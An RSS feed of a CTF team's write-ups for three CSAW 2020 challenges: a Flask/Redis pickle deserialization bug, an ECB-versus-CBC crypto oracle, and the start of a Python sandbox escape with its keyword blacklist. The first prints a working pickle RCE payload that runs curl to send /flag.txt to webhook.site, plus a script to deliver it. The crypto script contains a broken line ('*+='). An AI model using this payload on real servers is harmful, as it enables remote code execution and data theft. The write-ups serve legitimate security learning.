<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on NOVA CTF</title><link>/posts/</link><description>Recent content in Posts on NOVA CTF</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 17 Sep 2020 00:00:00 +0000</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>CSAW 2020 - flask_caching</title><link>/posts/csaw2020writeup-flask_caching/</link><pubDate>Thu, 17 Sep 2020 00:00:00 +0000</pubDate><guid>/posts/csaw2020writeup-flask_caching/</guid><description>CSAW Qualifiers 2020 - flask_caching We were presented with a simple Flask server, we can see the code bellow (see the full code).
#!/usr/bin/env python3 from flask import Flask from flask import request, redirect from flask_caching import Cache from redis import Redis import jinja2 import os app = Flask(__name__) app.config[&amp;#39;CACHE_REDIS_HOST&amp;#39;] = &amp;#39;localhost&amp;#39; app.config[&amp;#39;DEBUG&amp;#39;] = False cache = Cache(app, config={&amp;#39;CACHE_TYPE&amp;#39;: &amp;#39;redis&amp;#39;}) redis = Redis(&amp;#39;localhost&amp;#39;) jinja_env = jinja2.Environment(autoescape=[&amp;#39;html&amp;#39;, &amp;#39;xml&amp;#39;]) @app.route(&amp;#39;/&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) def notes_post(): if request.</description><content type="html"><![CDATA[<h1 id="csaw-qualifiers-2020---flask_caching">CSAW Qualifiers 2020 - flask_caching</h1>
<p>We were presented with a simple Flask server,
we can see the code bellow (see the <a href="app.py">full code</a>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask
<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> request, redirect
<span style="color:#f92672">from</span> flask_caching <span style="color:#f92672">import</span> Cache
<span style="color:#f92672">from</span> redis <span style="color:#f92672">import</span> Redis
<span style="color:#f92672">import</span> jinja2
<span style="color:#f92672">import</span> os

app <span style="color:#f92672">=</span> Flask(__name__)
app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;CACHE_REDIS_HOST&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>
app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;DEBUG&#39;</span>] <span style="color:#f92672">=</span> False

cache <span style="color:#f92672">=</span> Cache(app, config<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;CACHE_TYPE&#39;</span>: <span style="color:#e6db74">&#39;redis&#39;</span>})
redis <span style="color:#f92672">=</span> Redis(<span style="color:#e6db74">&#39;localhost&#39;</span>)
jinja_env <span style="color:#f92672">=</span> jinja2<span style="color:#f92672">.</span>Environment(autoescape<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;html&#39;</span>, <span style="color:#e6db74">&#39;xml&#39;</span>])


<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">notes_post</span>():
    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">        &lt;h4&gt;Post a note&lt;/h4&gt;
</span><span style="color:#e6db74">        &lt;form method=POST enctype=multipart/form-data&gt;
</span><span style="color:#e6db74">        &lt;input name=title placeholder=title&gt;
</span><span style="color:#e6db74">        &lt;input type=file name=content placeholder=content&gt;
</span><span style="color:#e6db74">        &lt;input type=submit&gt;
</span><span style="color:#e6db74">        &lt;/form&gt;
</span><span style="color:#e6db74">        &#39;&#39;&#39;</span>

    <span style="color:#66d9ef">print</span>(request<span style="color:#f92672">.</span>form, flush<span style="color:#f92672">=</span>True)
    <span style="color:#66d9ef">print</span>(request<span style="color:#f92672">.</span>files, flush<span style="color:#f92672">=</span>True)
    title <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;title&#39;</span>, default<span style="color:#f92672">=</span>None)
    content <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;content&#39;</span>, default<span style="color:#f92672">=</span>None)

    <span style="color:#66d9ef">if</span> title <span style="color:#f92672">is</span> None <span style="color:#f92672">or</span> content <span style="color:#f92672">is</span> None:
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Missing fields&#39;</span>, <span style="color:#ae81ff">400</span>

    content <span style="color:#f92672">=</span> content<span style="color:#f92672">.</span>stream<span style="color:#f92672">.</span>read()

    <span style="color:#66d9ef">if</span> len(title) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">or</span> len(content) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">256</span>:
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Too long&#39;</span>, <span style="color:#ae81ff">400</span>

    redis<span style="color:#f92672">.</span>setex(name<span style="color:#f92672">=</span>title, value<span style="color:#f92672">=</span>content, time<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)  <span style="color:#75715e"># Note will only live for max 30 seconds</span>

    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Thanks!&#39;</span>


<span style="color:#75715e"># This caching stuff is cool! Lets make a bunch of cached functions.</span>

<span style="color:#a6e22e">@cache.cached</span>(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_test0</span>():
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;test&#39;</span>
<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/test0&#39;</span>)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test0</span>():
    _test0()
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;test&#39;</span>

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    app<span style="color:#f92672">.</span>run(<span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, <span style="color:#ae81ff">5000</span>)
</code></pre></div><p>Analyzing the code, top to bottom we see that the server uses Redis as a cache, no big deal with that.
However, the way it is being used is weird.</p>
<p>Whenever a new note is being posted,
the &ldquo;raw&rdquo; operation is used,
however when using the test endpoints the calls are wrapped with the <code>@cache.cached</code> decorator.</p>
<p>Furthermore, the test endpoints always return <code>'test'</code> so even if we store something there we will not have direct feedback.</p>
<p>Following the decorator rabbit hole to the <a href="https://github.com/sh4nks/flask-caching/blob/9bd8365aa5bac9fb91e9e7ddc663ff087a97ab7a/flask_caching/backends/rediscache.py#L112-L115"><code>rediscache.py</code></a> we find the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self, key):
    <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>load_object(
        self<span style="color:#f92672">.</span>_read_clients<span style="color:#f92672">.</span>get(self<span style="color:#f92672">.</span>_get_prefix() <span style="color:#f92672">+</span> key)
    )
</code></pre></div><p>And following the <code>load_object</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_object</span>(self, value):
    <span style="color:#e6db74">&#34;&#34;&#34;The reversal of :meth:`dump_object`.  This might be called with
</span><span style="color:#e6db74">    None.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">if</span> value <span style="color:#f92672">is</span> None:
        <span style="color:#66d9ef">return</span> None
    <span style="color:#66d9ef">if</span> value<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;!&#34;</span>):
        <span style="color:#66d9ef">try</span>:
            <span style="color:#66d9ef">return</span> pickle<span style="color:#f92672">.</span>loads(value[<span style="color:#ae81ff">1</span>:])
        <span style="color:#66d9ef">except</span> pickle<span style="color:#f92672">.</span>PickleError:
            <span style="color:#66d9ef">return</span> None
    <span style="color:#66d9ef">try</span>:
        <span style="color:#66d9ef">return</span> int(value)
    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">ValueError</span>:
        <span style="color:#75715e"># before 0.8 we did not have serialization.  Still support that.</span>
        <span style="color:#66d9ef">return</span> value
</code></pre></div><p>Seeing <code>pickle.loads</code> means we have a winner.</p>
<p>According to the <a href="https://docs.python.org/3/library/pickle.html">documentation</a>:</p>
<blockquote>
<p>Warning</p>
<p>The pickle module is not secure. Only unpickle data you trust.</p>
<p>It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.</p>
</blockquote>
<p>Triggering the deserialization is easy,
just start the content with <code>!</code> and the cache will take care of the rest for use.</p>
<p>Now we just need to create a payload and find the cache key.</p>
<p>First, the cache key as it is the easiest part.</p>
<ul>
<li>Run <code>app.py</code> with a Redis instance (increase the cache timer if necessary).</li>
<li>Send a GET request to one of the test endpoints.</li>
<li>Use <code>redis-cli</code> to retrieve all stored keys with <code>redis-cli keys &quot;*&quot;</code>.</li>
<li>You now know the key is <code>flask_cache_view//testN</code> where <code>N</code> is the test endpoint number.</li>
</ul>
<p>We now move on to the pickle.</p>
<p>With a quick search we find that this is called pickle shellcode,
the idea is to serialize a pickle with executes code on deserialization.</p>
<p>I found <a href="https://gist.github.com/0xBADCA7/f4c700fcbb5fb8785c14">this GitHub gist</a> which shows a &ldquo;framework&rdquo; to write &ldquo;bad&rdquo; pickles.</p>
<p>From there we write our exploit class:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span>():
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#39;curl https://webhook.site/&lt;id&gt;?flag=`cat /flag.txt`&#39;</span>, ))
</code></pre></div><p>This works because <code>pickle</code> allows objects to decide how to be pickled using the <code>__reduce__</code> method,
hence we return a tuple of a <code>callable</code> and its arguments.</p>
<p>Using <code>os.system</code> we can launch an arbitrary process,
I used <code>curl</code> to send a request to <code>webhook.site</code> with the flag as a query parameter.</p>
<p>Now we just <a href="exploit.py">automate</a> the whole process,
serializing the Exploit object to bytes,
send the bytes as a file and request the test endpoint.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://web.chal.csaw.io:5000/&#34;</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span>():
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#39;curl https://webhook.site/127d80d9-c737-44fe-95b3-c053849634a5?flag=`cat /flag.txt`&#39;</span>, ))

bad_pickle <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;!&#34;</span> <span style="color:#f92672">+</span> pickle<span style="color:#f92672">.</span>dumps(Exploit())
requests<span style="color:#f92672">.</span>post(url,
    data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;flask_cache_view//test0&#34;</span>},
    files<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;content&#34;</span>:bad_pickle})
requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/test0&#34;</span>)
</code></pre></div>]]></content></item><item><title>CSAW 2020 - modus_operandi</title><link>/posts/csaw2020-modus_operandi/</link><pubDate>Thu, 17 Sep 2020 00:00:00 +0000</pubDate><guid>/posts/csaw2020-modus_operandi/</guid><description>This is a crypto challenge from the CSAW 2020 CTF originally worth 150 points.
The challenge initially tells us to connect as such:
$ nc crypto.chal.csaw.io 5001 Hello! For each plaintext you enter, find out if the block cipher used is ECB or CBC. Enter &amp;quot;ECB&amp;quot; or &amp;quot;CBC&amp;quot; to get the flag! We need to tell if the cipher being used to encode our plaintext is ECB or CBC. The big difference is that ECB, which stands for Electronic Code Book, always produces the same ciphertext for a given block.</description><content type="html"><![CDATA[<p>This is a crypto challenge from the CSAW 2020 CTF originally worth 150 points.</p>
<p>The challenge initially tells us to connect as such:</p>
<pre><code>$ nc crypto.chal.csaw.io 5001
Hello! For each plaintext you enter, find out if the block cipher used is ECB or CBC. Enter &quot;ECB&quot; or &quot;CBC&quot; to get the flag!
</code></pre><p>We need to tell if the cipher being used to encode our plaintext is ECB or CBC. The big difference is that ECB, which stands for Electronic Code Book, always produces the same ciphertext for a given block.</p>
<p>The first thing to do is figure out the cipher block size. We can do this easily by entering only a letter and check out the size of the output.</p>
<pre><code>$ nc crypto.chal.csaw.io 5001
(INITIAL MESSAGE)
Enter plaintext:
a
Ciphertext is:  333b2ddd618ce8a23993af9e094d7769
ECB or CBC?
</code></pre><p>We got <code>333b2ddd618ce8a23993af9e094d7769</code> as the ciphertext. Since this is hexadecimal representation, every character is 4 bits, thus making our block size 128 bits (4 * 32).</p>
<p>So to differentiate ECB from CBC we only need to send enough characters in the plaintext and then split our ciphertext every 32 characters (128 bits) and compare the first block of the ciphertext with the second. If these are equal then it&rsquo;s ECB, otherwise it&rsquo;s CBC.</p>
<p>I coded this into python and this is the result:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;crypto.chal.csaw.io&#39;</span>, <span style="color:#ae81ff">5001</span>)

modes_seq <span style="color:#f92672">=</span> []

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve</span>():
    <span style="color:#66d9ef">global</span> p
    <span style="color:#66d9ef">global</span> modes_seq

    counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
    plaintext <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>)
    
    <span style="color:#75715e"># receive initial message</span>
    p<span style="color:#f92672">.</span>recvlineS(keepends<span style="color:#f92672">=</span>False)
    <span style="color:#66d9ef">while</span> True:
        <span style="color:#75715e"># receive plaintext prompt</span>
        p<span style="color:#f92672">.</span>recvlineS(keepends<span style="color:#f92672">=</span>False)
        <span style="color:#75715e"># send plaintext</span>
        p<span style="color:#f92672">.</span>sendline(plaintext)
        <span style="color:#75715e"># receive header from line with ciphertext</span>
        p<span style="color:#f92672">.</span>recvuntilS(<span style="color:#e6db74">&#34;Ciphertext is:&#34;</span>)
        <span style="color:#75715e"># receive ciphertext</span>
        cipher <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvlineS()<span style="color:#f92672">.</span>strip()
        <span style="color:#75715e"># receive ECB or CBC prompt</span>
        p<span style="color:#f92672">.</span>recvlineS(keepends<span style="color:#f92672">=</span>False)
        <span style="color:#75715e"># check if it is ECB</span>
        is_ecb <span style="color:#f92672">=</span> check_equal_with_bs(cipher)
        <span style="color:#75715e"># send cipher mode</span>
        <span style="color:#66d9ef">if</span> is_ecb:
            p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;ECB&#39;</span>)
        <span style="color:#66d9ef">else</span>:
            p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;CBC&#39;</span>)
        <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#34;cipher {counter}&#34;</span>)
        counter <span style="color:#f92672">*+=</span> <span style="color:#ae81ff">1</span>


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_equal_with_bs</span>(cipher):
    bs <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>
    b0 <span style="color:#f92672">=</span> cipher[:bs]
    b1 <span style="color:#f92672">=</span> cipher[bs:bs<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>]

    <span style="color:#66d9ef">if</span> b0 <span style="color:#f92672">==</span> b1:
        <span style="color:#66d9ef">return</span> True


solve()
</code></pre></div><p>We will send 32 characters since these make up 32 bytes (256 bits), to make our 2 blocks. When we run it we get:</p>
<pre><code>python3 solve.py
[+] Opening connection to crypto.chal.csaw.io on port 5001: Done
cipher 1
cipher 2
cipher 3
cipher 4
(...)
cipher 174
cipher 175
cipher 176
Traceback (most recent call last):
  ( EXCEPTION INFO )
EOFError
</code></pre><p>It gave us an EOF after a while. After trying a couple of times we would understand this behaviour is recurrent.</p>
<p>After fiddling a bit (a lot actually) we can get to the result by checking out the cipher modes sequence.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># got this from tweaking the previous script</span>
mode_seqs <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>,
<span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>,
<span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>,
<span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>,
<span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>,
<span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>,
<span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>,
<span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>,
<span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>,
<span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>,
<span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>,
<span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>,
<span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>,
<span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>,
<span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>,
<span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>,
<span style="color:#e6db74">&#39;ECB&#39;</span>, <span style="color:#e6db74">&#39;CBC&#39;</span>]
binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#66d9ef">for</span> mode <span style="color:#f92672">in</span> mode_seqs:
    <span style="color:#66d9ef">if</span> mode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ECB&#34;</span>:
        binary <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;0&#34;</span>
    <span style="color:#66d9ef">else</span>:
        binary <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;1&#34;</span>

<span style="color:#66d9ef">print</span>(binary)
</code></pre></div><p>Our resulting binary is:</p>
<pre><code>0110011001101100011000010110011101111011010001010100001101000010010111110111001
0011001010100000001101100011011000111100101011111011100110101010101100011011010
110010010001111101
</code></pre><p>If we translate this to characters we get <code>flag{ECB_re@lly_sUck$}</code>. That&rsquo;s it.</p>
]]></content></item><item><title>CSAW 2020 - slithery</title><link>/posts/csaw2020writeup-slithery/</link><pubDate>Thu, 17 Sep 2020 00:00:00 +0000</pubDate><guid>/posts/csaw2020writeup-slithery/</guid><description>Setting up a new coding environment for my data science students. Some of them are l33t h4ck3rs that got RCE and crashed my machine a few times :(. Can you help test this before I use it for my class? Two sandboxes should be better than one...
nc pwn.chal.csaw.io 5011
sandbox.py
Looking at the file it seems we have a very simple REPL, with some code prepended to every line we write.</description><content type="html"><![CDATA[<p><code>Setting up a new coding environment for my data science students. Some of them are l33t h4ck3rs that got RCE and crashed my machine a few times :(. Can you help test this before I use it for my class? Two sandboxes should be better than one...</code></p>
<p>nc pwn.chal.csaw.io 5011</p>
<p><a href="./original.py">sandbox.py</a></p>
<p>Looking at the file it seems we have a very simple REPL, with some code prepended to every line we write. There is also a blacklist of words, which we do not have access to.</p>
<p>First I started by simply trying to run the file, which obviously didn&rsquo;t work, since I don&rsquo;t have &ldquo;blacklist&rdquo;, so I just replaced <code>blacklist.BLACKLIST</code> with <code>[]</code>
Now it did run, and we have a similar shell to the remote one, but without a blacklist. Lets fix that.</p>
<pre><code class="language-$" data-lang="$">['__builtins__', '__import__', 'eval', 'exec', 'import', 'from', 'os', 'sys', 'system', 'timeit', 'base64commands', 'subprocess', 'pty', 'platform', 'open', 'read', 'write', 'dir', 'type']
</code></pre><p>Huh, it just worked.</p>
